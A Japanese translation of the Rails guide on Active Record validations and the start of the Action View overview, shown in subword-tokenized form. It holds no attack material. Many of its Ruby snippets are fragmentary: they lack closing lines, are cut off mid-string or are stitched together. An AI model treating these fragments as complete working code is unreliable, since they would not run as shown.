▁この ヘルパーは 、` with ` オプション で 与えられた 正規表現 と 属性 の 値が マッチする かどうかを テスト すること によって バリデーション を行います 。
▁validates ▁: le g a c y _ code , ▁ format : ▁ { ▁with : ▁ / \ A [ a - z A - Z ] + \ z / ,
▁ message : ▁" 英 文字 のみ が 使用できます " ▁ }
▁デフォルトのエラーメッセージは ▁ _ " is ▁ invalid " _ ▁ です 。
▁### ▁` i nclusion `
▁この ヘルパーは 、 与えられた 集合 に 属性 の値 が含まれ ている かどうかを 検証 します 。
▁class ▁C of f e e ▁< ▁ActiveRecord :: Base
▁validates ▁: size , ▁ i nclusion : ▁ { ▁in : ▁% w ( s m all ▁ m ed i um ▁ l ar g e ) ,
▁` i nclusion ` ヘルパー には `: in ` オプション があり 、 受け 付け 可能 と する 値 の 集合 を指定します 。
▁`: in ` オプション には `: with in ` という エイリアス も あり 、 好 み に応じて どちら でも 使用できます 。
▁上の 例 では 、 属性 の 値を インクルード する方法 を 示す ために `: message ` オプション も 使用 しています 。
▁この ヘルパー の デフォルトの エラーメッセージ は ▁ _ " is ▁ not ▁ include d ▁in ▁the ▁ list " _ ▁ です 。
▁### ▁` length `
▁この ヘルパーは 、 属性 の値 の 長さ を 検証 します 。
▁ 多くの オプション があり 、 長さ 制限 を さまざまな 方法で 指定できます 。
▁validates ▁: name , ▁ length : ▁ { ▁ minimum : ▁2 ▁ }
▁validates ▁: b io , ▁ length : ▁ { ▁ ma x im um : ▁5 00 ▁ }
▁validates ▁: password , ▁ length : ▁ { ▁in : ▁ 6 . . 20 ▁ }
▁validates ▁: re g ist r ation _ number , ▁ length : ▁ { ▁is : ▁ 6 ▁ }
▁ 使用 可能な 長さ 制限 オプションは 以下の とおりです 。
▁* ▁`: minimum ` ▁- ▁ 属性 はこの 値 より 小さな 値を 取 れ ません 。
▁* ▁`: ma x im um ` ▁- ▁ 属性 はこの 値 より 大きな 値を 取 れ ません 。
▁* ▁`: in ` ▁ または ▁`: with in ` ▁- ▁ 属性 の 長さ は 、 与えられた 区 間 以 内で なければなりません 。
▁この オプション の値 は 範囲 で なければなりません 。
▁* ▁`: is ` ▁- ▁ 属性 の 長さ は 与えられた 値 と 等 しく なければなりません 。
▁デフォルトのエラーメッセージは 、 実行される バリデーション の 種類 によって 異なります 。
▁ デフォルトの メッセージ は `: w r on g _ length `、` : to o _ lo n g `、` : to o _ sh or t ` オプション を使用して カスタマイズ したり 、` % { count } ` を 長さ 制限 に対応する 数値 の プ レ ー ス ホ ル ダ として 使用 したり できます 。
▁`: message ` オプション を使用して エラーメッセージ を指定する こともできます 。
▁validates ▁: b io , ▁ length : ▁ { ▁ ma x im um : ▁ 100 0,
▁この ヘルパー はデフォルトで は 文字 単 位 で 長さ を チェック します が 、`: token ize r ` オプション を使用することで 他の 方法で 値を 区 分 することもできます 。
▁class ▁ E s s a y ▁< ▁ActiveRecord :: Base
▁validates ▁: content , ▁ length : ▁ {
▁ minimum : ▁ 30 0,
▁ ma x im um : ▁4 00 ,
▁to o _ sh or t : ▁" % { count } 語 以上 必要 です ",
▁デフォルトのエラーメッセージは 複数形 で 表現 されている ことにご注意ください ▁( 例 : ▁" is ▁to o ▁ sh or t ▁( minimum ▁is ▁% { count } ▁ cha r a c ter s ) ") 。
▁ このため 、`: minimum ` を 1 に設定する のであれば メッセージ を カスタマイズ して 単数形 に するか 、 代りに ` presence : ▁true ` を使用します 。
▁### ▁` n um er ical ity `
▁この ヘルパーは 、 属性 に 数値 のみ が 使用されている ことを 検証 します 。
▁ デフォルトで は 、 整 数 または 浮 動 小 数 点 に マッチ します 。 これらの 冒 頭 に 符 号 が 付 い ている 場合 も マッチ します 。
▁ 整 数 のみ に マッチ させ たい場合は 、`: only _ integer ` を true に します 。
▁`: only _ integer ` を ` true ` に設定する と 、
▁上の 正規表現 を使用して 属性 の値 に対する バリデーション が 行われます 。
▁ それ以外の 場合は 、` F lo at ` で 値を 数値 に変換 して から バリデーション を 行 お う とします 。
▁WARN ING : ▁上の 正規表現 では 末尾 に 改 行 記 号 が あって も マッチ します 。
▁class ▁P la y er ▁< ▁ActiveRecord :: Base
▁validates ▁: p o in t s , ▁ n um er ical ity : ▁true
▁validates ▁: g am es _ p la y ed , ▁ n um er ical ity : ▁ { ▁ only _ integer : ▁true ▁ }
▁この ヘルパーは 、`: only _ integer ` 以外に も 以下の オプション を使用して 制限 を 指定できます 。
▁* ▁`: g re at er _ th an ` ▁- ▁ 指定された 値 よりも 大きく なければならない こと を指定します 。
▁デフォルトのエラーメッセージは ▁ _ " m us t ▁be ▁ g re at er ▁ th an ▁% { count } " _ ▁ です 。
▁* ▁`: g re at er _ th an _ or _ equ al _ to ` ▁- ▁ 指定された 値 と 等 しい か 、 それ よりも 大きく なければならない こと を指定します 。
▁デフォルトのエラーメッセージは ▁ _ " m us t ▁be ▁ g re at er ▁ th an ▁ or ▁ equ al ▁to ▁% { count } " _ ▁ です 。
▁* ▁`: equ al _ to ` ▁- ▁ 指定された 値 と 等 しく なければならない こと を示します 。
▁デフォルトのエラーメッセージは ▁ _ " m us t ▁be ▁ equ al ▁to ▁% { count } " _ ▁ です 。
▁* ▁`: less _ th an ` ▁- ▁ 指定された 値 よりも 小 さ く なければならない こと を指定します 。
▁デフォルトのエラーメッセージは ▁ _ " m us t ▁be ▁ less ▁ th an ▁% { count } " _ . です 。
▁* ▁`: less _ th an _ or _ equ al _ to ` ▁- ▁ 指定された 値 と 等 しい か 、 それ よりも 小 さ く なければならない こと を指定します 。
▁デフォルトのエラーメッセージは ▁ _ " m us t ▁be ▁ less ▁ th an ▁ or ▁ equ al ▁to ▁% { count } " _ ▁ です 。
▁* ▁`: o d d ` ▁- ▁true に 設定 されている 場合は 、 奇 数 で なければなりません 。
▁デフォルトのエラーメッセージは ▁ _ " m us t ▁be ▁ o d d " _ ▁ です 。
▁* ▁`: e ve n ` ▁- ▁true に 設定 されている 場合は 、 偶 数 で なければなりません 。
▁デフォルトのエラーメッセージは ▁ _ " m us t ▁be ▁ e ve n " _ ▁ です 。
▁デフォルトのエラーメッセージは ▁ _ " is ▁ not ▁a ▁ number " _ ▁ です 。
▁### ▁` presence `
▁この ヘルパーは 、 指定された 属性 が 空 でない ことを確認します 。
▁ 値が ` nil ` や 空 文字 でない ( つまり 空 欄 でも なければ ホ ワ イ ト スペース でも ない ) ことを確認 するために 、 内部で は ` blank ?` メソッド を使用しています 。
▁validates ▁: name , ▁: login , ▁: email , ▁ presence : ▁true
▁ 関連付け が存在する ことを確認 したい場合は 、 関連付けられたオブジェクト 自体 が存在する ことを確認 し 、 そのオブジェクト が 関連付け に マッピング された 外部キー でない ことを確認 する必要があります 。
▁class ▁ L in e I te m ▁< ▁ActiveRecord :: Base
▁ belongs _ to ▁: order
▁validates ▁: order , ▁ presence : ▁true
▁ 関連付けられた レコード の 存 在 が 必 須 である 場合 、 これ を検証する には `: inverse _ of ` オプション で その 関連付け を指定する 必要があります 。
▁has _ many ▁: line _ item s , ▁ inverse _ of : ▁: order
▁この ヘルパー を使用して 、` has _ one ` または ` has _ many ` リレーションシップ を経由して 関連付けられたオブジェクト が存在する こと を検証する と 、` blank ?` でも なく ` m ar ke d _ for _ de s tr u c tion ?` ( 削除 するために マーク されている ) でも ない かどうか が チェック されます 。
▁### ▁` a b s en ce `
▁この ヘルパーは 、 指定された 属性 が 空 であることを 検証 します 。
▁ 値が ` nil ` や 空 文字 である ▁( つまり 空 欄 または ホ ワ イ ト スペース である ) ▁ かどうかを確認 するために 、 内部で は ` present ?` メソッド を使用しています 。
▁validates ▁: name , ▁: login , ▁: email , ▁a b s en ce : ▁true
▁ 関連付け が 存在しない ことを確認 したい場合は 、 関連付けられたオブジェクト 自体 が 存在しない かどうかを確認 し 、 そのオブジェクト が 関連付け に マッピング された 外部キー でない ことを確認 する必要があります 。
▁validates ▁: order , ▁a b s en ce : ▁true
▁ 関連付けられた レコード が存在し て は なら ない場合 、 これ を検証する には `: inverse _ of ` オプション で その 関連付け を指定する 必要があります 。
▁この ヘルパー を使用して 、` has _ one ` または ` has _ many ` リレーションシップ を経由して 関連付けられたオブジェクト が存在し ないこと を検証する と 、` presence ?` でも なく ` m ar ke d _ for _ de s tr u c tion ?` ( 削除 するために マーク されている ) でも ない かどうか が チェック されます 。
▁` false . present ?` は 常に false なので 、 真 偽 値 に対して この メソッドを使用すると 正しい 結果 が 得られ ません 。 真 偽 値が 存在しない ことを チェック したい場合は 、` validates ▁: field _ name , ▁ ex c l us ion : ▁ { ▁in : ▁[ true , ▁false ] ▁ } ` を使用する 必要があります 。
▁デフォルトのエラーメッセージは ▁ _ " m us t ▁be ▁ blank " _ ▁ です 。
▁### ▁` uniqueness `
▁この ヘルパーは 、 オブジェクトが 保存 される 直 前に 、 属性 の 値が 一意 であり 重複 していない ことを 検証 します 。
▁この ヘルパーは データベース 自体 に 一意性 の 制 約 を作成する わ け では ないので 、 2 つの データベース 接続 が た また ま 、 一意 で あって ほ しい カラム について 同じ 値 を持つ レコード を 2 つ 作成する ようなこと が 起 こ り 得 ます 。
▁これ を避ける には 、 データベースの 両方 の カラム に 一意 インデックス を 作成する必要があります 。
▁ 複 合 インデックス の詳細については [ MySQL の マ ニ ュ ア ル ]( http :// de v . my sql . com / doc / ref ma n / 5 . 6 / en / m ulti p le - column - index es . html ) ▁( 英語 ) ▁ を参照してください 。
▁validates ▁: email , ▁ uniqueness : ▁true
▁この バリデーション は 、 モデルの テーブル に対して 、 その 属性 と同じ 値 を持つ 既存の レコード がある かどうか を調べ る SQL クエリ を実行する こと によって 行われます 。
▁この ヘルパー には 、 一意性 チェック を 制限 するために 使用される 別の 属性 を指定する ための `: scope ` オプション があります 。
▁class ▁ H o li day ▁< ▁ActiveRecord :: Base
▁validates ▁: name , ▁ uniqueness : ▁ { ▁ scope : ▁: year ,
▁ message : ▁" 発生 は 年 に 1 度 まで である 必要があります " ▁ }
▁この ヘルパー には `: case _ s en s it ive ` という オプション もあります 。 これは 一意性 制 約 で 大文字 小文字 を 区別 する かどうかを指定します 。
▁この オプション はデフォルトで true です 。
▁validates ▁: name , ▁ uniqueness : ▁ { ▁ case _ s en s it ive : ▁false ▁ }
▁WARN ING : ▁ 一部の データベース では 、 大文字 小文字 を 区別 し ないように 設定 されている ことがあります 。
▁デフォルトのエラーメッセージは ▁ _ " has ▁ al read y ▁be en ▁t a ke n " _ ▁ です 。
▁### ▁` validates _ with `
▁この ヘルパーは 、 バリデーション 専 用の 別の クラス に レコード を 渡します 。
▁class ▁ G oo d n ess V al id at or ▁< ▁Active Model :: V al id at or
▁def ▁ validate ( record )
▁if ▁ record . first _ name ▁= = ▁" E v il "
▁ record . errors [: base ] ▁< < ▁" これは 悪 人 だ "
▁validates _ with ▁ G oo d n ess V al id at or
▁NOT E : ▁` record . errors [: base ] ` に追加 される エラー は 、 概 して 特定の 属性 よりも その レコード 全体 の 状態 に 関係 している ものです 。
▁` validates _ with ` は 、 バリデーション に 使用する 1 つの クラス 、 または クラスの リスト を 引数に 取り ます 。
▁` validates _ with ` には デフォルトの エラーメッセージ はありません 。
▁ エラーメッセージ が 必要 であれば 、 バ リ データ クラスの レコード の エラー コレクション に 手動で 追加する必要があります 。
▁ バリデーション メソッド を実装する には 、 定義 済み の ` record ` パラメータ を持つ 必要があります 。 この パラメータ は バリデーション を行なう レコード です 。
▁ 他の バリデーション と同様 、` validates _ with ` ヘルパー でも `: if `、` : unless `、` : on ` オプションを 取 ることができます 。
▁ これら 以外の オプションを 渡す と 、 バ リ データ クラス に ` options ` として 渡 されます 。
▁if ▁ options [: field s ] . any ? {
▁| field | ▁ record . s end ( field ) ▁= = ▁" E v il " ▁ }
▁validates _ with ▁ G oo d n ess V al id at or , ▁ field s : ▁ [: first _ name , ▁: last _ name ]
▁この バ リ データ は 、 アプリケーションの ラ イ フ サ イ ク ル 内で ▁* 一度 しか 初期化 され ない * ▁ 点 に ご注意ください 。 バリデーション が 実行される たびに 初期化 される ような ことはありません 。 インスタンス変数 の 扱 い には 十分 ご注意ください 。
▁作成した バ リ データ が 複 雑 になって インスタンス変数 を 使い た く な った 場合は 、 旧 来 の Ruby オブジェクトを 簡単に 使う ことができます 。
▁ validate ▁do ▁| person |
▁ G oo d n ess V al id at or . new ( person ). validate
▁class ▁ G oo d n ess V al id at or
▁def ▁ initialize ( person )
▁@ person ▁= ▁ person
▁def ▁ validate
▁if ▁ some _ com p l ex _ con d i tion _ in v ol v ing _ i v ar s _ and _ private _ method s ?
▁@ person . errors [: base ] ▁< < ▁" これは 悪 人 だ "
▁### ▁` validates _ each `
▁この ヘルパーは 、 1 つの ブロック に対して 属性を 検証 します 。
▁ 定義 済み のバリデーション 関数 はありません 。
▁以下の 例 では 、 苗 字 と 名前 が 小文字 で 始 ま ら ないように したい と 考え ています 。
▁validates _ each ▁: name , ▁: s ur name ▁do ▁| record , ▁ attr , ▁ value |
▁この ブロック は 、 レコード と 属性 の名前 、 そして 属性 の値 を受け取り ます 。
▁ ブロック 内で これら を使用して データ が 正しい かどうかを 自由に チェック できます 。
▁ バリデーション に 失敗した場合 には モデルに エラーメッセージ を追加し 、 バリデーション が 無効 になる ように してください 。
▁ 共通 のバリデーション オプション
▁ 共通 のバリデーション オプション を以下に示します 。
▁### ▁`: allow _ nil `
▁`: allow _ nil ` オプションは 、 対象 の 値が ` nil ` の 場合に バリデーション を スキップ します 。
▁ message : ▁" % { value } は 有効な 値 ではありません " ▁ } , ▁ allow _ nil : ▁true
▁### ▁`: allow _ blank `
▁`: allow _ blank ` オプションは `: allow _ nil ` オプション と似ています 。
▁この オプション を指定すると 、 属性 の 値が ` blank ?` に 該当する 場合に バリデーション が パス します 。 ` blank ?` に 該当する 値 には ` nil ` と 空 文字 も 含 まれ ます 。
▁class ▁ To p i c ▁< ▁ActiveRecord :: Base
▁validates ▁: title , ▁ length : ▁ { ▁is : ▁5 ▁ } , ▁ allow _ blank : ▁true
▁ To p i c . create ( title : ▁" ") . valid ?
▁ To p i c . create ( title : ▁nil ). valid ?
▁### ▁`: message `
▁ 既に 例 示 した ように 、`: message ` オプション を使用することで 、 バリデーション 失敗 時に ` errors ` コレクション に追加 される カスタム エラーメッセージ を 指定できます 。
▁この オプション を使用し ない場合 、 Active ▁Record は バリデーション ヘルパー の デフォルトの エラーメッセージ を使用します 。
▁### ▁`: on `
▁`: on ` オプションは 、 バリデーション 実行 の タ イ ミ ング を指定します 。
▁ ビルトイン のバリデーション ヘルパーは 、 デフォルトで は 保存 時に 実行されます 。 これは レコード の作成 時 および 更新 時の どちら の場合 にも 行われます 。
▁ バリデーション の タ イ ミ ング を変更 したい場合 、` on : ▁: create ` を 指定 すれば レコード 新規作成 時に のみ 検証 が行われ 、` on : ▁: update ` を 指定 すれば レコード の 更新 時に のみ 検証 が 行われます 。
▁# ▁ 値が 重複 して いて も email を 更新 できる
▁validates ▁: email , ▁ uniqueness : ▁true , ▁on : ▁: create
▁# ▁ 新 規 レコード 作成 時に 、 数字 でない 年 齢 表現 を 使用できる
▁validates ▁: age , ▁ n um er ical ity : ▁true , ▁on : ▁: update
▁# ▁ デフォルト ▁( 作成 時 と 更新 時の どちら の場合 にも バリデーション を行なう )
▁ 厳 密 な バリデーション
▁ バリデーション を 厳 密 に し 、 オブジェクトが 無効 だ った 場合に ` Active Model :: S t ri ct V al id ation F a il ed ` が発生する ように することができます 。
▁validates ▁: name , ▁ presence : ▁ { ▁ st ri ct : ▁true ▁ }
▁ Person . new . valid ?
▁# ▁=> ▁Active Model :: S t ri ct V al id ation F a il ed : ▁ 名前 は 空 欄 に できません
▁ カスタム の 例外 を `: st ri ct ` オプション に追加 することもできます 。
▁validates ▁: token , ▁ presence : ▁true , ▁ uniqueness : ▁true , ▁ st ri ct : ▁ To ke n G en er ation E x ce p tion
▁# ▁=> ▁ To ke n G en er ation E x ce p tion : ▁ トークン は 空 欄 に できません
▁ 条件 付き バリデーション
▁ 特定の 条件 を 満 た す 場合に のみ バリデーション を 実行 したい場合 があります 。
▁`: if ` オプション や `: unless ` オプション を使用することで このような 条件 を 指定できます 。 引数に は シンボル 、 文字列 、` Proc ` または ` Array ` を使用できます 。
▁`: if ` オプションは 、 特定の 条件 で バリデーション を行なう ▁** べ き である ** ▁ 場合に 使用します 。
▁ 特定の 条件 では バリデーション を行なう ▁** べ き でない ** ▁ 場合は 、`: unless ` オプション を使用します 。
▁### ▁`: if ` や `: unless ` で シンボル を使用する
▁ バリデーション の 実行 直 前に 呼び出される メソッド 名を シンボル で `: if ` や `: unless ` オプション に 指定 することもできます 。
▁これは 最も 頻繁に 使用される オプション です 。
▁validates ▁: c ar d _ number , ▁ presence : ▁true , ▁if : ▁: p a id _ with _ c ar d ?
▁def ▁ p a id _ with _ c ar d ?
▁ p a y m ent _ type ▁= = ▁" c ar d "
▁### ▁`: if ` や `: unless ` で 文字列 を使用する
▁ 文字列 を使用する こともできます 。 この 文字列 は 後 で ` eval ` で 評価 される ため 、 実行 可能な 正しい Ruby コードを 含 んで い る必要があります 。
▁この 方法は 、 文字列 が 十分 短 い 場合に のみ 使用する の が よいでしょう 。
▁validates ▁: s ur name , ▁ presence : ▁true , ▁if : ▁" name . nil ? "
▁### ▁`: if ` や `: unless ` で Proc を使用する
▁ 呼び出し たい ` Proc ` オブジェクトを `: if ` や `: unless ` で使用する こともできます 。
▁` Proc ` オブジェクト を使用すると 、 個 別の メソッド を指定する 代りに 、 その 場 で 条件 を 書くこと が できるようになります 。
▁ ワ ン ラ イ ナ ー に 収 ま る 条件 を使用したい場合 に 最 適 です 。
▁validates ▁: password , ▁ confirmation : ▁true ,
▁ unless : ▁ Proc . new ▁ { ▁| a | ▁a . password . blank ?
▁### ▁ 条件 付き バリデーション を グループ 化 する
▁1 つの 条件 を 複数の バリデーション で 共 用 できる と 便利な ことがあります 。 これは ` with _ options ` を使用することで 簡単に 実現 できます 。
▁with _ options ▁if : ▁: is _ admin ?
▁do ▁| admin |
▁ admin . validates ▁: password , ▁ length : ▁ { ▁ minimum : ▁10 ▁ }
▁ admin . validates ▁: email , ▁ presence : ▁true
▁` with _ options ` ブロック の 内 側 にある すべての バリデーション には 、` if : ▁: is _ admin ?` という 条件 が 渡 されます 。
▁### ▁ バリデーション の 条件 を 結合 する
▁ 逆 に 、 バリデーション を行なう 条件 を 複 数 定義 したい場合 、` Array ` を使用できます 。
▁ 同じ バリデーション に対して 、`: if ` または `: unless ` の どちら でも 使用できます 。
▁class ▁ Co m put er ▁< ▁ActiveRecord :: Base
▁validates ▁: m o us e , ▁ presence : ▁true ,
▁if : ▁[" m ar ke t . re t a il ? ", ▁: de s k to p ? ]
▁ unless : ▁ Proc . new ▁ { ▁| c | ▁c . t rack p ad . present ?
▁この バリデーション は 、`: if ` 条件 が すべて ` true ` になり 、 かつ `: unless ` が 1 つ も ` true ` に なら ない場合 に のみ 実行されます 。
▁ カスタム バリデーション を実行する
▁ ビルトイン のバリデーション ヘルパー だけで は 不 足 の場合 、 好 み の バ リ データ や バリデーション メソッド を作成して 使用できます 。
▁### ▁ カスタム バ リ データ
▁ カスタム バ リ データ ▁( valid at or ) ▁ は 、` Active Model :: V al id at or ` を 拡 張 した クラス です 。
▁これらの クラス では 、` validate ` メソッドが 実装 されている 必要があります 。 このメソッドは レコード を 1 つ 引数に 取り 、 それ に対して バリデーション を実行します 。
▁ カスタム バ リ データ は ` validates _ with ` メソッドを使用して 呼び出し ます 。
▁class ▁ M y V al id at or ▁< ▁Active Model :: V al id at or
▁ unless ▁ record . name . start s _ with ?
▁ record . errors [: name ] ▁< < ▁' 名前 は X で 始 ま る必要があります '
▁class ▁ Person
▁ include ▁Active Model :: V al id ation s
▁validates _ with ▁ M y V al id at or
▁ 個 別の 属性 を検証する ための カスタム バ リ データ を追加する には 、` Active Model :: E a ch V al id at or ` を使用する の が 最も 簡単 で 便利です 。
▁class ▁ E mail V al id at or ▁< ▁Active Model :: E a ch V al id at or
▁def ▁ validate _ each ( record , ▁ attribute , ▁ value )
▁ unless ▁ value ▁= ~ ▁ / \ A ( [ ^ @ \ s ] + ) @ ( ( ? : [ - a - z 0 - 9 ] + \ . ) + [ a - z ] { 2, }) \ z / i
▁ record . errors [ attribute ] ▁< < ▁( options [: message ] ▁| | ▁" は 正しい メールアドレス ではありません ")
▁validates ▁: email , ▁ presence : ▁true , ▁ email : ▁true
▁上の 例 に示したように 、 標準 のバリデーション と カスタム バリデーション を 組み合わせ る こともできます 。
▁### ▁ カスタム メソッド
▁ モデルの 状態 を 確認 し 、 無効な 場合に ` errors ` コレクション に メッセージ を追加する メソッド を作成する ことができます 。
▁1 つの クラス メソッド には 複数の シンボル を 渡す ことができます 。 バリデーション は 、 登録 された とおり の 順序 で 実行されます 。
▁class ▁ In v o i ce ▁< ▁ActiveRecord :: Base
▁ validate ▁: expir ation _ date _ ca n not _ b e _ in _ the _ p a st ,
▁: d is count _ ca n not _ b e _ g re at er _ th an _ to t al _ value
▁def ▁ expir ation _ date _ ca n not _ b e _ in _ the _ p a st
▁if ▁ expir ation _ date . present ?
▁ & & ▁ expir ation _ date ▁< ▁ Date . to day
▁ errors . add (: expir ation _ date , ▁" : ▁ 過 去 の 日付 は 使用 できません ")
▁def ▁d is count _ ca n not _ b e _ g re at er _ th an _ to t al _ value
▁if ▁d is count ▁ > ▁to t al _ value
▁ errors . add (: d is count , ▁" 合 計 額 を 上 回 る ことはできません ")
▁これらの バリデーション は 、` valid ?` を呼び出す たびに 実行されます 。
▁ カスタム バリデーション が 実行される タ イ ミ ング は 、`: on ` オプション を使用して 変更 できます 。 ` validate ` に対して ` on : ▁: create ` または ` on : ▁: update ` を指定します 。
▁ validate ▁: active _ customer , ▁on : ▁: create
▁def ▁ active _ customer
▁ errors . add (: customer _ id , ▁" is ▁ not ▁ active ") ▁ unless ▁ customer . active ?
▁ バリデーション エラー に対応する
▁ 既に 説明 した ` valid ?` メソッド や ` invalid ?` メソッドの 他 に 、 Rails では ` errors ` コレクション に 対応 し 、 オブジェクトの 正 当 性 を 検 査 するための メソッドが 多 数 用意されてい ます 。
▁ 以下 は 最も よく 使用される メソッドの 一覧 です 。
▁ 利用 可能な すべての メソッド については 、` Active Model :: Error s ` ドキュメント を参照してください 。
▁### ▁` errors `
▁ すべての エラー を含む ` Active Model :: Error s ` クラスの インスタンス を 1 つ 返します 。
▁ キー は 属性 名 、 値 は すべての エラー 文字列 の配列 です 。
▁validates ▁: name , ▁ presence : ▁true , ▁ length : ▁ { ▁ minimum : ▁3 ▁ }
▁ person ▁= ▁ Person . new
▁ person . valid ?
▁ person . errors . messages
▁ person ▁= ▁ Person . new ( name : ▁" John ▁D o e ")
▁ person . errors . messages ▁# ▁=> ▁ { }
▁` errors [ ] ` は 、 特定の 属性 について エラーメッセージ を チェック したい場合 に 使用します 。
▁ 指定 の 属性 に関する すべての エラーメッセージ の 文字列 の配列 を返します 。 1 つの 文字列 が 1 つの エラーメッセージ です 。
▁ 属性 に 関連する エラー が ない場合は 空 の配列 を返します 。
▁ person . errors [: name ] ▁# ▁=> ▁[ ]
▁ person ▁= ▁ Person . new ( name : ▁" J D ")
▁ person . errors [: name ]
▁### ▁` errors . add `
▁` add ` メソッドを使用して 、 特定の 属性 に 関連する メッセージ を 手動で 追加 できます 。
▁` errors . full _ messages ` メソッド または ` errors . to _ a ` メソッドを使用して 、 ユーザーが 実際に 見 ること の できる フォーム 内の メッセージ を 表示 できます 。
▁ これら 特定の メッセージ の 前に は 、 大文字 で 始 ま る 属性 名 が追加され ます 。 ` add ` メソッドは 、 メッセージ を追加した い 属性 名 、 および メッセージ 自身 を受け取り ます 。
▁def ▁a _ method _ us ed _ for _ validation _ p ur p o s es
▁ errors . add (: name , ▁" 以下の 文字 を含む ことはできません ▁ !
▁ person ▁= ▁ Person . create ( name : ▁" !
▁# ▁=> ▁[" 以下の 文字 を含む ことはできません ▁ !
▁ person . errors . full _ messages
▁` [ ] = ` セ ッ ター を使用して 同じ ことを 行 え ます 。
▁def ▁a _ method _ us ed _ for _ validation _ p ur p o s es
▁ errors [: name ] ▁= ▁" 以下の 文字 を含む ことはできません ▁ !
▁ person ▁= ▁ Person . create ( name : ▁" !
▁ person . errors [: name ]
▁# ▁=> ▁[" 以下の 文字 を含む ことはできません ▁ !
▁ person . errors . to _ a
▁# ▁=> ▁[" Name は 以下の 文字 を含む ことはできません ▁ !
▁### ▁` errors [: base ] `
▁ 個 別の 属性 に 関連する エラーメッセージ を追加する 代りに 、 オブジェクトの 状態 全体 に 関連する エラーメッセージ を追加する こともできます 。
▁ 属性 の 値が ど のような もの であっても オブジェクトが 無効 であることを 通知 したい場合 に このメソッド を使用できます 。
▁` errors [: base ] ` は 配列 なので 、 これ に 文字列を 単 に追加する だけで エラーメッセージ として 使用 できるようになります 。
▁ errors [: base ] ▁< < ▁" この 人 物 は 以下の 理由 で 無効 です ... "
▁### ▁` errors . clear `
▁` clear ` メソッドは 、` errors ` コレクション に含まれる メッセージ をすべて ク リ ア したい場合 に 使用できます 。
▁ 無効な オブジェクト に対して ` errors . clear ` メソッドを 呼び出し ても 、 それ だけで オブジェクトが 有効 になる わけではありません ので ご注意ください 。 ` errors ` は 空 になります が 、` valid ?` や オブジェクトを データベースに保存 し よう と する メソッドが 次 回 呼び出され たとき に 、 バリデーション が 再 実行されます 。
▁ そして いずれ か のバリデーション が 失敗する と 、` errors ` コレクション に 再 び メッセージ が 格 納 されます 。
▁ person . errors . clear
▁ person . errors . empty ?
▁ p . save ▁# ▁=> ▁false
▁ p . errors [: name ]
▁### ▁` errors . size `
▁` size ` メソッドは 、 そのオブジェクト の エラーメッセージ の 総 数 を返します 。
▁ person . errors . size ▁# ▁=> ▁2
▁ person ▁= ▁ Person . new ( name : ▁" A n d re a ", ▁ email : ▁" and re a @ example . com ")
▁ person . errors . size ▁# ▁=> ▁0
▁ バリデーション エラー を ビューで 表示する
▁ モデル を作成して バリデーション を追加し 、 Web の フォーム 経由で その モデル が 作成 できる ようになった ら 、 その モデル で バリデーション が 失敗した ときに エラーメッセージ を表示し た く なります 。
▁ エラーメッセージ の 表示 方法は アプリケーション ごとに 異なる ため 、 Rails では これらの メッセージ を直接 生成 する ビュー ヘルパーは 含 まれ て いません 。
▁しかし 、 Rails では 一般的な バリデーション メソッドが 多 数 提供され ている ので 、 カスタム の メソッド を作成する のは 比 較 的 簡単 です 。
▁また 、 scaffold を使用して 生成 を行なう と 、 その モデルの エラーメッセージ をすべて 表示する ERB が Rails によって 一部の ` _ form . html . erb ` ファイル に追加 されます 。
▁< div ▁id =" error _ ex p la n ation ">
▁< ul >
▁< li > <%= ▁ m s g ▁%></ li >
▁<% ▁end ▁%>
▁</ ul >
▁</ div >
▁また 、 Rails の フォーム ヘルパー を使用して フォーム を生成し た場合 、 ある フィールド で バリデーション エラー が発生する と 、 その エ ン ト リ の 周 り に追加 の ` < div > ` が自動的に 生成されます 。
▁< div ▁class =" field _ with _ errors ">
▁</ div >
▁この div タグ に 好 み の スタイル を与える ことができます 。
▁Rails が 生成 する デフォルトの scaffold によって 、 以下の CSS ルール が追加され ます 。
▁ . field _ with _ errors ▁ {
▁ p adding : ▁2 p x ;
▁ b ack g r ound - c ol or : ▁ re d ;
▁d is p la y : ▁ table ;
▁この CSS は 、 エラー を含む フィールド を 赤 い 枠 で 囲 み ます 。
▁Action ▁ View ▁ の概要
▁* ▁Action ▁ View の概要 と Rails で の 利用 法
▁* ▁ テンプレート 、 パーシャル ( 部分 テンプレート ) 、 レイアウト の 最 適 な 利用 法
▁* ▁Action ▁ View で 提供され る ヘルパー の 紹 介 と 、 カスタム ヘルパー の作成 法
▁* ▁ ビュー の ロー カ ラ イ ズ 方法
▁Action ▁ View について
▁Action ▁ View および Action ▁ Controller は 、 Action ▁P ack を構成する 2 大 要素 です 。
▁Rails では 、 Web リクエスト は Action ▁P ack で 取り 扱 わ れ ます 。 この 動作 は コントローラ 寄 り の 部分 ▁( ロ ジ ッ ク の 実行 ) ▁ と ビュー 寄 り の 部分 ( テンプレート の 描画 ) ▁ に 分 か れ ます 。
▁Action ▁ Controller は 、 データベース と の やりとり や 、 必要 に 応 じ た C R U D ▁( Create / Re ad / U p date / D e let e ) ▁ アクション の 実行 に か か わ ります 。
▁Action ▁ View ▁ は その後 レスポンス を 実際の Web ページに まとめ る 役 割 を 担 います 。
▁Action ▁ View の テンプレート は 、 HTML タグ の 合 間 に ERB ▁( E m b ed de d ▁Ruby ) ▁ を含む 形式 で 書かれ ます 。
▁ ビュー テンプレート が コードの 繰り返し で う ず ま って 乱 雑 になる の を避ける ために 、 フォーム ・ 日付 ・ 文字列 に対して 共通 の動作 を 提 供 する ヘルパー クラス が 多 数 用意されてい ます 。
▁ アプリケーションの 機能 向 上 に応じて 独自の ヘルパー を追加する ことも 簡単に できます 。
▁NOT E : ▁Action ▁ View の一部 の 機能 は Active ▁Record と 結 び つ い ています が 、 Action ▁ View が Active ▁Record に 依 存 している わけではありません 。
▁Action ▁ View は 独 立 した パ ッ ケ ー ジ であり 、 ど のような Ruby ライブラリ と でも 組み合わせ て 使用できます 。
▁Action ▁ View を Rails で使用する
▁ アプリケーションの ` app / views ` ディレクトリ には 、 1 つの コントローラ ごとに 1 つの ディレクトリ が作成され 、 そこ に ビュー テンプレート ファイルが 置かれます 。 この ビュー テンプレート は その コントローラ と 関連付け られ ています 。
▁これらの ファイルは 、 コントローラ 内に ある アクション ごとに 出力 された 結果を ビューで 表示 するために 使用されます 。
▁ scaffold を使用して リソース を生成する ときに 、 Rails が デフォルトで どんな こと を行なう のか 見 てみましょう 。
▁[ ... ]
▁invo ke ▁ scaffold _ controller
▁create
▁app
▁invo ke ▁ erb
▁app
